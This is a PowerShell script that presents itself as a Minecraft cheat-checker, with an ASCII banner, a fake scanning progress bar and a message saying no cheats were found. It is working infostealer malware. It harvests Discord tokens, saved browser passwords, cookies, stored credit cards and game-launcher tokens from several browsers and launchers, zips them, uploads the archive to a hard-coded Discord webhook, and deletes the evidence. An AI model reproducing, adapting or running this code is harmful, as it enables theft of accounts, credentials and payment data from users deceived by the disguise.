Write-Output " by funtime-project                                       "
Write-Output "   ____ _                _      ____ _               _    "
Write-Output "  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __"
Write-Output " | |   | '_ \ / _ \/ _\ | __| | |   | '_ \ / _ \/ __| |/ /"
Write-Output " | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < "
Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\" 
Write-Output "                                                          "
Write-Output "Загрузка... / Loading...                                  "
$FormatEnumerationLimit = -1
$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 300)

$userName = Split-Path $env:USERPROFILE -Leaf
$Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
try {
    Stop-Process -Name "browser" -Force
} catch {}

Start-Sleep -Seconds 1

$filePaths = @{
    # Discord
    "$env:TEMP\discord_tokens.txt" = "discord_tokens.txt"

    # Yandex
    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies" = "yandex_cookies.txt"
    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Passman Logs" = "yandex_passwords_2.txt"
    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Credit Cards" = "yandex_credit_cards.txt"
    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data" = "yandex_passwords.txt"
    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data" = "yandex_passwords_main.txt"

    # Google Chrome
    "C:\Users\$userName\AppData\Local\Google\Chrome\User Data\Default\Login Data" = "chrome_passwords.txt"

    # Microsoft Edge
    "C:\Users\$userName\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" = "edge_passwords.txt"

    # Mozilla Firefox
    "C:\Users\$userName\AppData\Roaming\Mozilla\Firefox\Profiles\key4.db" = "mozilla_firefox_passwords_2.txt"
    "C:\Users\$userName\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json" = "mozilla_firefox_passwords.txt"

    # Opera
    "C:\Users\$userName\AppData\Roaming\Opera Software\Opera Stable\Login Data" = "opera_passwords.txt"
    "C:\Users\$userName\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" = "opera_gx_passwords.txt"

    # Lunar Client
    "C:\Users\$userName\.lunarclient\settings\game\accounts.json" = "lunar_client_tokens.txt"
    # Cristalix
    "C:\Users\$userName\.cristalix\.launcher" = "cristalix_tokens.txt"
    # Minecraft
    "C:\Users\$userName\AppData\Roaming\.minecraft\launcher_profiles.json" = "minecraft_tokens.txt"
}

# Discord tokens START #
$dsc_targets = @(
    "$env:APPDATA\Discord",
    "$env:APPDATA\discordcanary",
    "$env:APPDATA\discordptb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default"
)

$dsc_regexes = @(
    "[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
    "mfa\.[\w-]{84}"
)

$dsc_tokens = @()

foreach ($target in $dsc_targets) {
    $leveldbPath = Join-Path $target "Local Storage\leveldb"

    if (Test-Path $leveldbPath) {
        Get-ChildItem -Path $leveldbPath -Filter "*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $fileContent = Get-Content $_.FullName -Raw
            foreach ($regex in $dsc_regexes) {
                $matches = [regex]::Matches($fileContent, $regex)
                foreach ($match in $matches) {
                    $dsc_tokens += $match.Value
                }
            }
        }

        Get-ChildItem -Path $leveldbPath -Filter "*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $fileContent = Get-Content $_.FullName -Raw
            foreach ($regex in $dsc_regexes) {
                $matches = [regex]::Matches($fileContent, $regex)
                foreach ($match in $matches) {
                    $dsc_tokens += $match.Value
                }
            }
        }
    }
}

if ($dsc_tokens -and $dsc_tokens.Count -gt 0) {
    $filePath = Join-Path $env:Temp "discord_tokens.txt"
    $dsc_tokens | Out-File -FilePath $filePath -Encoding UTF8
}
# Discord tokens END #

$zipFilePath = Join-Path $env:Temp "yawsteal.zip"

if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

$tempFolder = Join-Path $env:Temp "tempZipFolder"
if (Test-Path $tempFolder) {
    Remove-Item $tempFolder -Recurse -Force
}
New-Item -ItemType Directory -Path $tempFolder | Out-Null

foreach ($filePath in $filePaths.Keys) {
    $copyName = $filePaths[$filePath]
    if (Test-Path $filePath) {
        try {
            $destinationPath = Join-Path -Path $tempFolder -ChildPath $copyName
            Copy-Item -Path $filePath -Destination $destinationPath -Force
            #Write-Output "File '$filePath' copied to the temporary folder."
        } catch {
            #Write-Warning "Error copying file '$filePath': $_"
        }
    } else {
        #Write-Warning "File '$filePath' not found. Skipping."
    }
}

try {
    Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFilePath -Force
    #Write-Output "ZIP archive created at '$zipFilePath'."
} catch {
    #Write-Error "Error creating ZIP archive: $_"
    return
}

if (-Not (Test-Path $zipFilePath)) {
    #Write-Error "ZIP archive not created. Stopping."
    return
}

$archiveName = $userName + "_data.zip"
try {
    Add-Type -AssemblyName System.Net.Http
    $httpClient = New-Object System.Net.Http.HttpClient
    $formData = New-Object System.Net.Http.MultipartFormDataContent

    $stringContent = New-Object System.Net.Http.StringContent("> Кто-то попался в ловушечку Ю_ю")
    $formData.Add($stringContent, "content")

    $fileStream = [System.IO.File]::OpenRead($zipFilePath)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
    $formData.Add($fileContent, "file", $archiveName)

    $response = $httpClient.PostAsync($Webhook_link, $formData).Result

    if ($response.IsSuccessStatusCode) {
        #Write-Output "ZIP archive sent successfully!"
    } else {
        #Write-Error "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
    }
} catch {
    #Write-Error "Error sending ZIP archive: $_"
} finally {
}

Remove-Item $zipFilePath -Force
Remove-Item "$env:TEMP\discord_tokens.txt" -Force
Write-Output "———————————————————————————————————————————————————————————"
Write-Output " "
Write-Output " @ Current task:    Scanning C:\Users\$userName for Doomsday"
$progressBarLength = 100
$i = 0
for (; $i -le $progressBarLength; $i++) {
    $progressBar = "[" + ("=" * $i).PadRight($progressBarLength) + "]"
    Write-Host -NoNewline "`r$progressBar ($([math]::Round(($i / $progressBarLength) * 100)))%"
    Start-Sleep -Milliseconds 200
}
Write-Output " "
Write-Output "———————————————————————————————————————————————————————————"

Write-Output " "
Write-Output " >>> Проверка на читы пройдена. Doomsday и прочие скрытые клиенты не были найденны"

Pause
Start-Sleep -Seconds 2
exit
